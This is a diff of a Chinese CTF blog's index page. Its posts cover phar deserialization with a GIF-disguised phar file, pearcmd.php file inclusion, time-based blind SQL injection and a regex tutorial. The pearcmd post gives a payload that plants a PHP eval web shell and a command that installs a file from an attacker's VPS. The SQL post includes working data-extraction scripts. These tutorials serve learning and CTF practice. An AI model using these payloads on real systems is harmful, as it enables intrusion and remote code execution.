@@ -155,6 +155,192 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://qyzy.github.io/2023/07/28/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://github.com/QYZY/image/blob/main/cat.jpg?raw=true">
+      <meta itemprop="name" content="竹云">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Welcome To QYZY's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/07/28/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="post-title-link" itemprop="url">phar反序列化</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-07-28 15:36:26 / 修改时间：15:38:03" itemprop="dateCreated datePublished" datetime="2023-07-28T15:36:26+08:00">2023-07-28</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="phar文件结构">phar文件结构</h1>
+<ol type="1">
+<li><p>stub<br />
+一个标志，格式为<code>xxx&lt;?php xxx;__HALT_COMPILER();?&gt;</code>,必须以<code>__HALT_COMPILER();</code>结尾，否则phar扩展将无法识别这个文件为phar文件。</p></li>
+<li><p>a manifest describing the contents<br />
+phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。</p></li>
+<li><p>the file contents<br />
+被压缩文件的内容</p></li>
+<li><p>[optional] a signature for verifying Phar integrity (phar file
+format only)<br />
+签名，放在文件末尾</p></li>
+</ol>
+<h1 id="生成phar文件">生成phar文件</h1>
+<p>php内置了一个Phar类来处理相关操作，要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">TestObject</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h1 id="伪造其他格式的文件">伪造其他格式的文件</h1>
+<p>phar必须以<code>__HALT_COMPILER();?</code>来结尾，我们可以通过在它前面添加文件头
++ 修改后缀的方式将phar文件伪装成其他格式的文件。 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br></pre></td></tr></table></figure>
+最后的效果 <img
+src="https://s3.bmp.ovh/imgs/2023/07/25/2423dc3dd366ebba.png" /></p>
+<h1 id="触发反序列化的文件操作函数">触发反序列化的文件操作函数</h1>
+<p>以下的文件系统函数在通过<code>phar://</code>伪协议解析<code>phar</code>文件时，都会将<code>meta-data</code>进行反序列化
+<img
+src="https://s3.bmp.ovh/imgs/2023/07/25/a25c022eaddbb7af.png" /></p>
+<p>如果限制<code>phar://</code>不能出现在头几个字符，可以用<code>Bzip / Gzip</code>协议绕过
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$filename = &#x27;compress.zlib://phar://phar.phar/test.txt&#x27;;</span><br></pre></td></tr></table></figure> 同样适用于<code>compress.bzip2://</code></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://qyzy.github.io/2023/07/28/pear%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://github.com/QYZY/image/blob/main/cat.jpg?raw=true">
+      <meta itemprop="name" content="竹云">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Welcome To QYZY's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/07/28/pear%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="post-title-link" itemprop="url">pear文件包含</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-07-28 15:30:47 / 修改时间：15:37:42" itemprop="dateCreated datePublished" datetime="2023-07-28T15:30:47+08:00">2023-07-28</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="利用条件">利用条件</h1>
+<p>安装了pear扩展 php开启了<code>register_argc_argv</code>选项</p>
+<p>docker中默认都开启</p>
+<h1 id="register_argc_argv">register_argc_argv</h1>
+<p><img src="https://s3.bmp.ovh/imgs/2023/07/28/8fbcac33456cc860.png" />
+在命令行模式下获取传入的参数，在web服务的情况下获取url中<code>?</code>后面的内容，<em><strong>无论是否有<code>=</code>号</strong>
+<img src="https://s3.bmp.ovh/imgs/2023/07/28/def0c651719cd2db.png" />
+<img src="https://s3.bmp.ovh/imgs/2023/07/28/44555fc9f3043dbf.png" />
+在web中传参有几点需要注意的： </em>
+<code>=</code>和<code>&amp;</code>会被当成字符串解析 *
+每个参数之间需要使用<code>+</code>分割，不能使用空格 *
+它的解析不影响正常的GET传参 <img
+src="https://s3.bmp.ovh/imgs/2023/07/28/fbd8e7bc4f0bc9c6.png" /></p>
+<h1 id="pearcmd.php">pearcmd.php</h1>
+<p>一般在docker中的默认安装目录为<code>/usr/local/lib/php</code>,也有可能因为版本不同在<code>/usr/share/php/pearcmd.php</code></p>
+<p>pear/pcel是一个命令行工具。如果我们能够包含其中的文件，并控制输入的参数，就可以通过它执行命令。</p>
+<h2 id="config-create">config-create</h2>
+<p>创建配置文件，可以在不出网的情况下挂马。<br />
+第一个参数为写入的内容，但必须以<code>/</code>开头，第二个参数为写入文件的路径。
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=@eval($_POST[&#x27;cmd&#x27;]);?&gt;+/tmp/test.php</span><br></pre></td></tr></table></figure> 发送时需要抓包发送，不然会被url编码 <img
+src="https://s3.bmp.ovh/imgs/2023/07/28/a57d4a9d1ba01220.png" />
+然后包含<code>/tmp/test.php</code>就可以RCE了</p>
+<h2 id="install">install</h2>
+<p>需要靶机出网 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pear install http://[vps]:[port]/test1.php</span><br></pre></td></tr></table></figure>
+会从vps上下载<code>test1.php</code>到<code>/tmp/pear/download/</code>目录，我们可以使用<code>--installroot</code>选项指定安装目录
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?+install+--installroot+&amp;file=/usr/local/lib/php/pearcmd.php&amp;+http://[vps]:[port]/test1.php</span><br></pre></td></tr></table></figure></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://qyzy.github.io/2023/05/10/LaTeX%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1794,242 +1980,6 @@ target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/266244">�
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://qyzy.github.io/2022/11/18/%E5%BB%B6%E6%97%B6%E7%9B%B2%E6%B3%A8/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://github.com/QYZY/image/blob/main/cat.jpg?raw=true">
-      <meta itemprop="name" content="竹云">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Welcome To QYZY's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/11/18/%E5%BB%B6%E6%97%B6%E7%9B%B2%E6%B3%A8/" class="post-title-link" itemprop="url">延时盲注</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-11-18 17:15:18" itemprop="dateCreated datePublished" datetime="2022-11-18T17:15:18+08:00">2022-11-18</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-04-23 17:34:45" itemprop="dateModified" datetime="2023-04-23T17:34:45+08:00">2023-04-23</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="基本利用-sleep">基本利用-sleep</h1>
-<p>基础利用 用法：sleep(延时的秒数)</p>
-<p>一般情况下，使用if或case构造条件表达式进行延时： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if((condition),sleep(5),0);</span><br><span class="line">CASE WHEN (condition) THEN sleep(5) ELSE 0 END;</span><br></pre></td></tr></table></figure> ##
-无if和case的解决办法
-假设if和case被ban了，又想要根据condition的真假来决定是否触发sleep()，可以将conditon整合进sleep()中，做乘法即可：
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sleep(5*(condition))</span><br></pre></td></tr></table></figure>
-如果condition为真则返回1，5<em>(condition)即为5，延时5秒；如果condition为假则返回0，5</em>(condition)即为5*0为0，延时0秒</p>
-<h1 id="bypass方法">Bypass方法</h1>
-<p><strong>benchmark</strong> 是替代sleep的首选。
-用法：benchmark(执行多少次，执行什么操作)<br />
-通过修改执行的次数和执行的操作(比如sha1(sha1(sha1()))这样多套几层)，可以精准控制延时时间。</p>
-<h1 id="正则">正则</h1>
-<p>通过正则的状态机不断进行状态转换，增加比配的时长，达到延时的目的。例如：
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select rpad(&#x27;a&#x27;,499999,&#x27;a&#x27;) RLIKE concat(repeat(&#x27;(a.*)+,30),&#x27;b&#x27;);</span><br></pre></td></tr></table></figure></p>
-<h1 id="写脚本的技巧">写脚本的技巧</h1>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">start_time = int(time.time())</span><br><span class="line">requests.get(url)</span><br><span class="line">end_time = int(time.time())</span><br><span class="line">if end_time - start_time &gt; 3: # 用开始时间和结束时间做差</span><br><span class="line">    print(&quot;延时发生了，注入成功&quot;)</span><br></pre></td></tr></table></figure>
-<p>这其实非常不好！因为我们发现除了sleep其他基本都不太能精准控制时长，这样写脚本就是：你延时多久我就等你多久。太慢了！如果一次延时要一个小时，你也要等他一个小时吗？很明显不太明智，正确的写延时盲注脚本的方法应该是：
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    requests.get(url,timeout=<span class="number">3</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;延时发生了，注入成功&quot;</span>)</span><br></pre></td></tr></table></figure>
-我们利用timeout=3设置了一个3秒的延时，如果超时会抛出Exception。这样写代码的好处是：就算它要延时一年，我们也就等他3秒钟，然后就开始下一轮循坏了，不用陪着MySQL延时，大大提高了脚本的效率。</p>
-<h1 id="代码实现">代码实现</h1>
-<p>具体代码实现和布尔盲注脚本类似 下面是未改进的： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造字母表，根据字母表去爆破每一位的具体值</span></span><br><span class="line">alphabet = string.ascii_letters + string.digits + <span class="string">&quot;,&#125;&#123;_-=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 题目的URL</span></span><br><span class="line">url = <span class="string">&quot;http://localhost/sqli/Less-9/?id=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 注入什么数据，select就写什么子查询语句</span></span><br><span class="line">select =  <span class="string">&quot;select database()&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 用来保存注入出的结果</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>): <span class="comment"># 外层循环，从1开始，因为截取的位数是从1开始的</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> alphabet: <span class="comment"># 内层循环，是具体需要测试的值</span></span><br><span class="line">        payload = <span class="string">f&quot;1&#x27; and if(substr((<span class="subst">&#123;select&#125;</span>),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;ch&#125;</span>&#x27;,sleep(2),0) --+&quot;</span></span><br><span class="line">        start_time = time.time()</span><br><span class="line">        r = requests.get(url=url+payload)</span><br><span class="line">        end_time = time.time()</span><br><span class="line">        t = end_time - start_time</span><br><span class="line">        <span class="keyword">if</span> t &gt;= <span class="number">2</span> :</span><br><span class="line">            result += ch</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;注入成功:&quot;</span>,result)</span><br><span class="line">            <span class="keyword">break</span>  <span class="comment"># 这一位已经跑出来了.可以break掉然后下一轮寻黄跑下一位数据了</span></span><br><span class="line">        <span class="keyword">if</span> ch == alphabet[-<span class="number">1</span>]:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;注入完成&quot;</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure></p>
-<p>使用try-except改进后代码如下： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造字母表，根据字母表去爆破每一位的具体值</span></span><br><span class="line">alphabet = string.ascii_letters + string.digits + <span class="string">&quot;,&#125;&#123;_-=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 题目的URL</span></span><br><span class="line">url = <span class="string">&quot;http://localhost/sqli/Less-9/?id=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 注入什么数据，select就写什么子查询语句</span></span><br><span class="line">select =  <span class="string">&quot;select database()&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 用来保存注入出的结果</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>): <span class="comment"># 外层循环，从1开始，因为截取的位数是从1开始的</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> alphabet: <span class="comment"># 内层循环，是具体需要测试的值</span></span><br><span class="line">        payload = <span class="string">f&quot;1&#x27; and if(substr((<span class="subst">&#123;select&#125;</span>),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;ch&#125;</span>&#x27;,sleep(2),0) --+&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url=url+payload,timeout=<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            result += ch</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;注入成功:&quot;</span>,result)</span><br><span class="line">            <span class="keyword">break</span>  <span class="comment"># 这一位已经跑出来了.可以break掉然后下一轮寻黄跑下一位数据了</span></span><br><span class="line">        <span class="keyword">if</span> ch == alphabet[-<span class="number">1</span>]:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;注入完成&quot;</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://qyzy.github.io/2022/11/17/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://github.com/QYZY/image/blob/main/cat.jpg?raw=true">
-      <meta itemprop="name" content="竹云">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Welcome To QYZY's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/11/17/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" class="post-title-link" itemprop="url">正则表达式</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-11-17 18:03:57" itemprop="dateCreated datePublished" datetime="2022-11-17T18:03:57+08:00">2022-11-17</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-04-23 17:34:38" itemprop="dateModified" datetime="2023-04-23T17:34:38+08:00">2023-04-23</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/MISC/" itemprop="url" rel="index"><span itemprop="name">MISC</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>在正则表达式中，如果直接给出字符，就是精确匹配。用<code>\d</code>可以匹配一个数字，<code>\w</code>可以匹配一个字母或数字，所以：
-*
-<code>'00\d</code>可以匹配<code>'007'</code>但无法匹配<code>'00A'</code>;
-* <code>'\d\d\d'</code>可以匹配<code>'010'</code>; *
-<code>'\w\w\d'</code>可以匹配<code>'py3'</code>;<br />
-<code>.</code>可以匹配任意字符，所以： *
-<code>'py.'</code>可以匹配<code>'pyc'</code>、<code>'pyo'</code>、<code>'py!'</code>等等。<br />
-要匹配变长的字符串，在正则表达式中，用<code>*</code>表示任意个字符（包括0个），用<code>+</code>表示至少一个字符，
-用<code>?</code>表示0个或1个字符，用<code>&#123;n&#125;</code>表示n个字符，用<code>&#123;n,m&#125;</code>表示n-m个字符；<br />
-来看一个复杂的例子<code>\d&#123;3&#125;\s+\d&#123;3,8&#125;</code>。
-我们来从左到右解读一下： 1.
-<code>\d&#123;3&#125;</code>表示匹配3个数字，例如<code>'010'</code>; 2.
-<code>\s</code>可以匹配一个空格（也包括Tab等空白符），所以<code>\s+</code>表示至少有一个空格，例如匹配<code>' '</code>，<code>'    '</code>等；
-3. <code>\d&#123;3,8&#125;</code>表示3-8个数字。例如<code>'1234567'</code>。
-综合起来，上面的正则表达式可以匹配任意个空格隔开的带区号的电话号码。<br />
-如果要匹配<code>'010-12345'</code>这样的电话号码呢？由于<code>'-'</code>是特殊字符，在正则表达式中，要用<code>'\'</code>转义，所以，上面的正则式<code>\d&#123;3&#125;\-\d&#123;3-8&#125;</code>。
-但是仍然无法匹配
-<code>'010 - 12345'</code>因为带有空格。所以我们需要更复杂的匹配方式。</p>
-<p><strong>进阶</strong>
-要做更精确地匹配，可以用<code>[]</code>表示范围，比如： *
-<code>[0-9a-zA-Z\_]</code> 可以匹配一个数字、字母、或者下划线; *
-<code>[0-9a-zA-Z\_+]</code>可以匹配至少由一个数字、字母、或者下划线组成的字符串，比如<code>'a100'</code>、<code>'0_Z'</code>、<code>'Py300'</code>等等;
-*
-<code>[a-zA-Z\_][0-9a-zA-Z\_]*</code>可以匹配由字母或者下划线开头，后接任意个由一个数字、字母或者下划线组成的字符串，也就是Python的合法变量；
-*
-<code>[a-zA-Z\_][0-9a-zA-Z\_]&#123;0,19&#125;</code>更精确地限制了变量地长度式1-20个字符（前面1个字符+后面最多19个字符）。<br />
-<code>A|B</code>可以匹配A或B，所以<code>(P|p)ython</code>可以匹配<code>'Python'</code>或者<code>'python'</code>。<br />
-<code>^</code>表示行的开头,<code>^\d</code>表示必须以数字开头。<br />
-<code>$</code>表示行的结束，<code>\d$</code>表示必须以数字结束。<br />
-<code>py</code>也可以匹配<code>'python'</code>，但是加上<code>^py$</code>就变成了整行匹配，就只能匹配<code>'py'</code>了。</p>
-<hr />
-<h1 id="re模块">re模块</h1>
-<p>由于Python的字符串本身也用<code>\</code>转义，所以要特别注意：
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&#x27;ABC\\-001&#x27;</span> <span class="comment"># python的字符串</span></span><br><span class="line"><span class="comment"># 对应的正则表达式字符串变成：</span></span><br><span class="line"><span class="comment"># &#x27;ABC\-001&#x27;</span></span><br></pre></td></tr></table></figure>
-因此我们强烈建议用python的<code>r</code>前缀，就不用考虑转义的问题了：
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">r&#x27;ABC\-001&#x27;</span> <span class="comment"># python的字符串</span></span><br><span class="line"><span class="comment"># 对应的正则表达式字符串不变：</span></span><br><span class="line"><span class="comment"># &#x27;ABC\-001&#x27;</span></span><br></pre></td></tr></table></figure>
-<code>match()</code>方法判断是否匹配，如果匹配成功，返回一个<code>Match</code>对象，否则返回<code>None</code>。常见的判断方法是：
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">test = <span class="string">&#x27;用户输入的字符串&#x27;</span></span><br><span class="line"><span class="keyword">if</span> re.<span class="keyword">match</span>(<span class="string">r&#x27;正则表达式&#x27;</span>,test):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;ok&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;failed&#x27;</span>)</span><br></pre></td></tr></table></figure></p>
-<h2 id="切分字符串"><strong>切分字符串</strong></h2>
-<p>用正则表达式切分字符串比用固定的字符更灵活，请看正常的切分代码：
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;<span class="string">&#x27;a b   c&#x27;</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;c&#x27;</span>]</span><br></pre></td></tr></table></figure> 无法识别连续的空格，用正则表达式试试： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;re.split(<span class="string">r&#x27;\s+&#x27;</span>,<span class="string">&#x27;a b   c&#x27;</span>)</span><br><span class="line">[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>]</span><br></pre></td></tr></table></figure></p>
